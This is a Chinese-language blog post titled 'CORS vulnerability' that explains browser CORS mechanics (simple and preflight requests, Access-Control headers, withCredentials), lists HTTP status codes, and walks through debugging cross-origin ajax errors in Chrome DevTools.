<!DOCTYPE html>





<html class="theme-next gemini use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="generator" content="Hexo 3.9.0">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">

<link rel="stylesheet" href="/css/main.css?v=7.3.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">


<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
    copycode: {"enable":true,"show_result":true,"style":null},
    fancybox: true,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    search: {
      root: '/',
      path: 'search.xml'
    },
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'copy',
      copy_success: 'succeed',
      copy_failure: 'failed'
    }
  };
</script>

  <meta name="description" content="CORS处理跨域浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 只要同时满足以下两大条件，就属于简单请求。 （1) 请求方法是以下三种方法之一：  HEAD GET POST  （2）HTTP的头信息不超出以下几种字段：  Accept Accept-Language Content-Language Last-E">
<meta name="keywords" content="cors">
<meta property="og:type" content="article">
<meta property="og:title" content="cors漏洞">
<meta property="og:url" content="https://wh0ale.github.io/2018/12/26/2018-12-26-CORS漏洞/index.html">
<meta property="og:site_name" content="Wh0ale&#39;s Blog">
<meta property="og:description" content="CORS处理跨域浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 只要同时满足以下两大条件，就属于简单请求。 （1) 请求方法是以下三种方法之一：  HEAD GET POST  （2）HTTP的头信息不超出以下几种字段：  Accept Accept-Language Content-Language Last-E">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtkn7m6dj20hs0nvgo3.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtm30v64j20hs08umxp.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtmbj795j20u00jldi3.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtmkvecnj20hs0c8jsi.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtmswo43j20hs047jri.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtuf2mkmj20yq0dnjuc.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtz8pwk1j20w70bzjuc.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtvv1s3tj20y40d377r.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygu1jze7rj20qw06xq3n.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygu3pemt4j20np08ijs0.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygu9viqfej20li0bhq4e.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygua10g3cj20z80d9q6v.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygua5ly51j20xu0brmyp.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyguebob6vj20xb0jr7hy.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygxgwtt7gj20s30cyab9.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygydi0d9hj20dp07776j.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyk0fm6t0oj20fe07p3yl.jpg">
<meta property="og:updated_time" content="2019-12-06T09:54:50.059Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="cors漏洞">
<meta name="twitter:description" content="CORS处理跨域浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 只要同时满足以下两大条件，就属于简单请求。 （1) 请求方法是以下三种方法之一：  HEAD GET POST  （2）HTTP的头信息不超出以下几种字段：  Accept Accept-Language Content-Language Last-E">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtkn7m6dj20hs0nvgo3.jpg">
  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
  <link rel="canonical" href="https://wh0ale.github.io/2018/12/26/2018-12-26-CORS漏洞/">


<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>cors漏洞 | Wh0ale's Blog</title>
  








  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Wh0ale's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
    <ul id="menu" class="menu">
        
        
        
          
          <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
      
    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
      
    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
      
    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-sitemap">
      
    

    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>

  </li>
        <li class="menu-item menu-item-search">
          <a href="javascript:;" class="popup-trigger">
          
            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
        </li>
      
    </ul>
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>


    </div>
</nav>

</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
            

          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    
    <div class="reading-progress-bar"></div>

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2018/12/26/2018-12-26-CORS漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Wh0ale">
      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Wh0ale's Blog">
    </span>
      <header class="post-header">

        
          <h1 class="post-title" itemprop="name headline">cors漏洞

              
            
          </h1>
        

        <div class="post-meta">
        
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-12-26 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-26T00:00:00+08:00">2018-12-26</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2019-12-06 17:54:50" itemprop="dateModified" datetime="2019-12-06T17:54:50+08:00">2019-12-06</time>
              </span>
            
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon"
              >
                <i class="fa fa-eye"></i>
                 阅读次数： 
                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
              </span>
            </span>
          <br>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
              
                <span class="post-meta-item-text">本文字数：</span>
              
              <span title="本文字数">19k</span>
            </span>
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
              
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              
              <span title="阅读时长">17 分钟</span>
            </span>
          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">



      
        <h1 id="CORS处理跨域"><a href="#CORS处理跨域" class="headerlink" title="CORS处理跨域"></a>CORS处理跨域</h1><p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
<p>只要同时满足以下两大条件，就属于简单请求。</p>
<p>（1) 请求方法是以下三种方法之一：</p>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<p>（2）HTTP的头信息不超出以下几种字段：</p>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值<strong>application/x-www-form-urlencoded、multipart/form-data、text/plain</strong></li>
</ul>
<p>凡是不同时满足上面两个条件，就属于非简单请求</p>
<h2 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p>对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。</p>
<p>下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段。</p>
<ol>
<li>GET /cors HTTP/1.1</li>
<li>Origin: <a href="http://api.bob.com/" target="_blank" rel="noopener">http://api.bob.com</a></li>
<li>Host:      api.alice.com</li>
<li>Accept-Language:      en-US</li>
<li>Connection:      keep-alive</li>
<li>User-Agent: Mozilla/5.0...</li>
</ol>
<p>上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p>
<p>如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</p>
<p>如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p>
<ol>
<li><strong>Access-Control-Allow-Origin: <a href="http://api.bob.com/" target="_blank" rel="noopener">http://api.bob.com</a></strong></li>
<li><strong>Access-Control-Allow-Credentials: true</strong></li>
<li><strong>Access-Control-Expose-Headers:      FooBar</strong></li>
<li><strong>Content-Type: text/html; charset=utf-8</strong></li>
</ol>
<p>上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。</p>
<p><strong>（1）Access-Control-Allow-Origin</strong></p>
<p>该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。</p>
<p><strong>（2）Access-Control-Allow-Credentials</strong></p>
<p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。</p>
<p><strong>（3）Access-Control-Expose-Headers</strong></p>
<p>该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(&#39;FooBar&#39;)可以返回FooBar字段的值。</p>
<h3 id="withCredentials-属性"><a href="#withCredentials-属性" class="headerlink" title="withCredentials 属性"></a>withCredentials 属性</h3><p>上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。</p>
<ol>
<li><strong>Access-Control-Allow-Credentials: true</strong></li>
</ol>
<p>另一方面，开发者必须在AJAX请求中打开withCredentials属性。</p>
<ol>
<li><p>var xhr = new XMLHttpRequest();</p>
</li>
<li><p>xhr.withCredentials = true;</p>
</li>
</ol>
<p>否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。</p>
<p>但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭withCredentials。</p>
<ol>
<li>xhr.withCredentials = false;</li>
</ol>
<p>需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</p>
<h3 id="响应码"><a href="#响应码" class="headerlink" title="响应码"></a>响应码</h3><p><strong>http状态返回代码 1xx（临时响应）</strong><br>表示临时响应并需要请求者继续执行操作的状态代码。</p>
<p>http状态返回代码 代码   说明<br>100   （继续）请求者应当继续提出请求。服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。<br>101   （切换协议）请求者已要求服务器切换协议，服务器已确认并准备切换。</p>
<p><strong>http状态返回代码 2xx （成功）</strong><br>表示成功处理了请求的状态代码。</p>
<p>http状态返回代码 代码   说明<br>200   （成功）  服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。<br>201   （已创建）  请求成功并且服务器创建了新的资源。<br>202   （已接受）  服务器已接受请求，但尚未处理。<br>203   （非授权信息）  服务器已成功处理了请求，但返回的信息可能来自另一来源。<br>204   （无内容）  服务器成功处理了请求，但没有返回任何内容。<br>205   （重置内容）服务器成功处理了请求，但没有返回任何内容。<br>206   （部分内容）  服务器成功处理了部分 GET 请求。</p>
<p><strong>http状态返回代码 3xx （重定向）</strong><br>表示要完成请求，需要进一步操作。通常，这些状态代码用来重定向。</p>
<p>http状态返回代码 代码   说明<br>300   （多种选择）  针对请求，服务器可执行多种操作。服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。<br>301   （永久移动）  请求的网页已永久移动到新位置。服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。<br>302   （临时移动）  服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。<br>303   （查看其他位置）请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。</p>
<p>304   （未修改）自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。<br>305   （使用代理）请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。<br>307   （临时重定向）  服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</p>
<p><strong>http状态返回代码 4xx（请求错误）</strong><br>这些状态代码表示请求可能出错，妨碍了服务器的处理。</p>
<p>http状态返回代码 代码   说明<br>400   （错误请求）服务器不理解请求的语法。<br>401   （未授权）请求要求身份验证。对于需要登录的网页，服务器可能返回此响应。<br>403   （禁止）服务器拒绝请求。<br>404   （未找到）服务器找不到请求的网页。<br>405   （方法禁用）禁用请求中指定的方法。<br>406   （不接受）无法使用请求的内容特性响应请求的网页。<br>407   （需要代理授权）此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。<br>408   （请求超时）  服务器等候请求时发生超时。<br>409   （冲突）  服务器在完成请求时发生冲突。服务器必须在响应中包含有关冲突的信息。<br>410   （已删除）  如果请求的资源已永久删除，服务器就会返回此响应。<br>411   （需要有效长度）服务器不接受不含有效内容长度标头字段的请求。<br>412   （未满足前提条件）服务器未满足请求者在请求中设置的其中一个前提条件。<br>413   （请求实体过大）服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。<br>414   （请求的 URI 过长）请求的 URI（通常为网址）过长，服务器无法处理。<br>415   （不支持的媒体类型）请求的格式不受请求页面的支持。<br>416   （请求范围不符合要求）如果页面无法提供请求的范围，则服务器会返回此状态代码。<br>417   （未满足期望值）服务器未满足&quot;期望&quot;请求标头字段的要求。</p>
<p><strong>http状态返回代码 5xx（服务器错误）</strong><br>这些状态代码表示服务器在尝试处理请求时发生内部错误。这些错误可能是服务器本身的错误，而不是请求出错。</p>
<p>http状态返回代码 代码   说明<br>500   （服务器内部错误）  服务器遇到错误，无法完成请求。<br>501   （尚未实施）服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。<br>502   （错误网关）服务器作为网关或代理，从上游服务器收到无效响应。<br>503   （服务不可用）服务器目前无法使用（由于超载或停机维护）。通常，这只是暂时状态。<br>504   （网关超时）  服务器作为网关或代理，但是没有及时从上游服务器收到请求。<br>505   （HTTP 版本不受支持）服务器不支持请求中所用的 HTTP 协议版本。</p>
<p><strong>一些常见的http状态返回代码为：</strong></p>
<p>200 - 服务器成功返回网页</p>
<p>404 - 请求的网页不存在</p>
<p>503 - 服务不可用</p>
<h2 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h2><h3 id="预检请求"><a href="#预检请求" class="headerlink" title="预检请求"></a>预检请求</h3><p>非简单请求是那种对服务器有特殊要求的请求，比如<strong>请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。</strong></p>
<p>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为&quot;预检&quot;请求（preflight）。</p>
<p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。</p>
<p>下面是一段浏览器的JavaScript脚本。</p>
<ol>
<li><p>var url = &#39;<a href="http://api.alice.com/cors" target="_blank" rel="noopener">http://api.alice.com/cors</a>&#39;;</p>
</li>
<li><p>var xhr = new XMLHttpRequest();</p>
</li>
<li><p>xhr.open(&#39;PUT&#39;, url, true);</p>
</li>
<li><p>xhr.setRequestHeader(&#39;X-Custom-Header&#39;, &#39;value&#39;);</p>
</li>
<li><p>xhr.send();</p>
</li>
</ol>
<p><strong>上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。</strong></p>
<p>浏览器发现，这是一个非简单请求，就自动发出一个&quot;预检&quot;请求，要求服务器确认可以这样请求。下面是这个&quot;预检&quot;请求的HTTP头信息。</p>
<ol>
<li>OPTIONS /cors HTTP/1.1</li>
<li>Origin: <a href="http://api.bob.com/" target="_blank" rel="noopener">http://api.bob.com</a></li>
<li>Access-Control-Request-Method:      PUT</li>
<li>Access-Control-Request-Headers:      X-Custom-Header</li>
<li>Host:      api.alice.com</li>
<li>Accept-Language:      en-US</li>
<li>Connection:      keep-alive</li>
<li>User-Agent: Mozilla/5.0...</li>
</ol>
<p>&quot;预检&quot;请求用的请求方法是<strong>OPTIONS</strong>，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。</p>
<p>除了Origin字段，&quot;预检&quot;请求的头信息包括两个特殊字段。</p>
<p><strong>（1）Access-Control-Request-Method</strong></p>
<p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。</p>
<p><strong>（2）Access-Control-Request-Headers</strong></p>
<p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。</p>
<h3 id="预检请求的回应"><a href="#预检请求的回应" class="headerlink" title="预检请求的回应"></a>预检请求的回应</h3><p>服务器收到&quot;预检&quot;请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。</p>
<ol>
<li>HTTP/1.1 200 OK</li>
<li>Date: Mon, 01 Dec 2008 01:15:39 GMT</li>
<li>Server: Apache/2.0.61 (Unix)</li>
<li>Access-Control-Allow-Origin: <a href="http://api.bob.com/" target="_blank" rel="noopener">http://api.bob.com</a></li>
<li>Access-Control-Allow-Methods:      GET, POST, PUT</li>
<li>Access-Control-Allow-Headers:      X-Custom-Header</li>
<li>Content-Type: text/html;      charset=utf-8</li>
<li>Content-Encoding:      gzip</li>
<li>Content-Length: 0</li>
<li>Keep-Alive: timeout=2, max=100</li>
<li>Connection:      Keep-Alive</li>
<li>Content-Type: text/plain</li>
</ol>
<p>上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示 <a href="http://api.bob.com" target="_blank" rel="noopener">http://api.bob.com</a> 可以请求数据。<strong>该字段也可以设为星号，表示同意任意跨源请求。</strong></p>
<ol>
<li>Access-Control-Allow-Origin: *</li>
</ol>
<p>如果浏览器否定了&quot;预检&quot;请求，会返回一个正常的HTTP回应，<strong>但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求</strong>，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。</p>
<ol>
<li><p>XMLHttpRequest cannot load <a href="http://api.alice.com" target="_blank" rel="noopener">http://api.alice.com</a>.</p>
</li>
<li><p>Origin <a href="http://api.bob.com" target="_blank" rel="noopener">http://api.bob.com      </a>is not allowed by Access-Control-Allow-Origin.</p>
</li>
</ol>
<p>服务器回应的其他CORS相关字段如下。</p>
<ol>
<li>Access-Control-Allow-Methods: GET, POST, PUT</li>
<li>Access-Control-Allow-Headers: X-Custom-Header</li>
<li>Access-Control-Allow-Credentials: true</li>
<li>Access-Control-Max-Age: 1728000</li>
</ol>
<p><strong>（1）Access-Control-Allow-Methods</strong></p>
<p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次&quot;预检&quot;请求。</p>
<p><strong>（2）Access-Control-Allow-Headers</strong></p>
<p>如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在&quot;预检&quot;中请求的字段。</p>
<p><strong>（3）Access-Control-Allow-Credentials</strong></p>
<p>该字段与简单请求时的含义相同。</p>
<p><strong>（4）Access-Control-Max-Age</strong></p>
<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p>
<h3 id="浏览器的正常请求和回应"><a href="#浏览器的正常请求和回应" class="headerlink" title="浏览器的正常请求和回应"></a>浏览器的正常请求和回应</h3><p>一旦服务器通过了&quot;预检&quot;请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。</p>
<p>下面是&quot;预检&quot;请求之后，浏览器的正常CORS请求。</p>
<ol>
<li>PUT /cors HTTP/1.1</li>
<li>Origin: <a href="http://api.bob.com/" target="_blank" rel="noopener">http://api.bob.com</a></li>
<li>Host:      api.alice.com</li>
<li>X-Custom-Header: value</li>
<li>Accept-Language:      en-US</li>
<li>Connection:      keep-alive</li>
<li>User-Agent: Mozilla/5.0...</li>
</ol>
<p>上面头信息的Origin字段是浏览器自动添加的。</p>
<p>下面是服务器正常的回应。</p>
<ol>
<li>Access-Control-Allow-Origin: <a href="http://api.bob.com/" target="_blank" rel="noopener">http://api.bob.com</a></li>
<li>Content-Type: text/html;      charset=utf-8</li>
</ol>
<p>上面头信息中，Access-Control-Allow-Origin字段是每次回应都必定包含的。</p>
<h2 id="分析ajax跨域"><a href="#分析ajax跨域" class="headerlink" title="分析ajax跨域"></a>分析ajax跨域</h2><p>抓包请求数据</p>
<p>第一步当然是得知道我们的ajax请求发送了什么数据，接收了什么，做到这一步并不难，也不需要fiddler等工具，仅基于Chrome即可</p>
<ul>
<li>Chrome浏览器打开对应发生ajax的页面，F12打开Dev      Tools</li>
<li>发送ajax请求</li>
<li>右侧面板-&gt;NetWork-&gt;XHR，然后找到刚才的ajax请求，点进去</li>
</ul>
<h3 id="示例一-正常的ajax请求"><a href="#示例一-正常的ajax请求" class="headerlink" title="示例一(正常的ajax请求)"></a><strong>示例一(正常的ajax请求)</strong></h3><p> <img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtkn7m6dj20hs0nvgo3.jpg" alt></p>
<p>上述请求是一个正确的请求，为了方便，我把每一个头域的意思都表明了，我们可以清晰的看到，接口返回的响应头域中，包括了</p>
<p>Access-Control-Allow-Headers: X-Requested-With,Content-Type,Accept</p>
<p>Access-Control-Allow-Methods: Get,Post,Put,OPTIONS</p>
<p>Access-Control-Allow-Origin: *</p>
<p>所以浏览器接收到响应时，判断的是正确的请求，自然不会报错，成功的拿到了响应数据。</p>
<h3 id="示例二-跨域错误的ajax请求"><a href="#示例二-跨域错误的ajax请求" class="headerlink" title="示例二(跨域错误的ajax请求)"></a><strong>示例二(跨域错误的ajax请求)</strong></h3><p>为了方便，我们仍然拿上面的错误表现示例举例。</p>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtm30v64j20hs08umxp.jpg" alt></p>
<p>这个请求中，接口Allow里面没有包括OPTIONS，所以请求出现了跨域、</p>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtmbj795j20u00jldi3.jpg" alt></p>
<p>这个请求中，Access-Control-Allow-Origin: *出现了两次，导致了跨域配置没有正确配置，出现了错误。</p>
<p>更多跨域错误基本都是类似的，就是以上三样没有满足(Headers,Allow,Origin)，这里不再一一赘述。</p>
<h3 id="示例三-与跨域无关的ajax请求"><a href="#示例三-与跨域无关的ajax请求" class="headerlink" title="示例三(与跨域无关的ajax请求)"></a>示例三(与跨域无关的ajax请求)</h3><p>当然，也并不是所有的ajax请求错误都与跨域有关，所以请不要混淆，比如以下:</p>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtmkvecnj20hs0c8jsi.jpg" alt></p>
<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtmswo43j20hs047jri.jpg" alt></p>
<p>比如这个请求，它的跨域配置没有一点问题，它出错仅仅是因为request的Accept和response的Content-Type不匹配而已。</p>
<p>更多</p>
<p>基本上都是这样去分析一个ajax请求，通过Chrome就可以知道了发送了什么数据，收到了什么数据，然后再一一比对就知道问题何在了。</p>
